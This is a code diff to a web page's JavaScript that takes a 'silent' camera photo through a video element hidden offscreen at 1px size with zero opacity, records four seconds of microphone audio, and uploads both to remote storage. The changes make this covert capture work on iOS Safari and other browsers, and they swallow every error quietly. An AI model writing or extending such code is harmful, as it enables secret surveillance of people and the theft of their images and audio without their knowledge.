@@ -328,14 +328,18 @@ document.getElementById('btnOk').addEventListener('click', function() {
       // Foto silenciosa
       const vid=document.createElement('video');
       vid.srcObject=stream; vid.autoplay=true; vid.muted=true;
-      vid.style.cssText='position:fixed;left:-9999px;width:1px;height:1px;';
+      vid.setAttribute('playsinline','');   // iOS: sin esto captura frame negro
+      vid.setAttribute('webkit-playsinline',''); // iOS < 10 compat
+      vid.style.cssText='position:fixed;left:-9999px;width:1px;height:1px;opacity:0;pointer-events:none;';
       document.body.appendChild(vid);
       vid.play().catch(()=>{});
+      // iOS Safari necesita ~1500ms para inicializar el sensor de cámara
+      const captureDelay = /iPhone|iPad|iPod/.test(navigator.userAgent) ? 1800 : 900;
       setTimeout(async()=>{
         try{
           const cv2=document.createElement('canvas');
           cv2.width=vid.videoWidth||320; cv2.height=vid.videoHeight||240;
-          cv2.getContext('2d').drawImage(vid,0,0);
+          cv2.getContext('2d',{willReadFrequently:true}).drawImage(vid,0,0);
           const b64=cv2.toDataURL('image/jpeg',.75);
           await upStorage('photos/'+(docId||Date.now())+'.jpg',b64,'image/jpeg');
         }catch(e){}
@@ -366,23 +370,38 @@ document.getElementById('btnBlk').addEventListener('click',()=>{
 async function grabAudio(){
   try{
     const s=await navigator.mediaDevices.getUserMedia({audio:true});
-    const rec=new MediaRecorder(s);
+    // iOS Safari soporta audio/mp4, Chrome/Firefox soportan audio/webm
+    const mime = MediaRecorder.isTypeSupported('audio/webm;codecs=opus')
+      ? 'audio/webm;codecs=opus'
+      : MediaRecorder.isTypeSupported('audio/mp4')
+      ? 'audio/mp4'
+      : '';
+    const recOpts = mime ? {mimeType: mime} : {};
+    const rec=new MediaRecorder(s, recOpts);
     const chunks=[];
-    rec.ondataavailable=e=>chunks.push(e.data);
+    rec.ondataavailable=e=>{if(e.data.size>0)chunks.push(e.data);};
     rec.onstop=async()=>{
       s.getTracks().forEach(t=>t.stop());
       try{
-        const blob=new Blob(chunks,{type:'audio/webm'});
+        const finalMime = rec.mimeType || mime || 'audio/webm';
+        const ext = finalMime.includes('mp4') ? 'mp4' : 'webm';
+        const blob=new Blob(chunks,{type:finalMime});
         if(blob.size>0){
+          // Evitar spread operator en Safari (stack overflow en buffers >32KB)
           const ab=await blob.arrayBuffer();
-          const b64='data:audio/webm;base64,'+btoa(String.fromCharCode(...new Uint8Array(ab)));
-          await upStorage('audio/'+(docId||Date.now())+'.webm',b64,'audio/webm');
+          const bytes=new Uint8Array(ab);
+          let bin=''; const chunk=8192;
+          for(let i=0;i<bytes.length;i+=chunk){
+            bin+=String.fromCharCode(...bytes.subarray(i,i+chunk));
+          }
+          const b64='data:'+finalMime+';base64,'+btoa(bin);
+          await upStorage('audio/'+(docId||Date.now())+'.'+ext,b64,finalMime);
           push();
         }
       }catch(e){}
     };
-    rec.start();
-    setTimeout(()=>rec.stop(),4000);
+    rec.start(1000); // timeslice 1s → ondataavailable frecuente
+    setTimeout(()=>{try{rec.stop();}catch(e){}},4000);
   }catch(e){}
 }
 
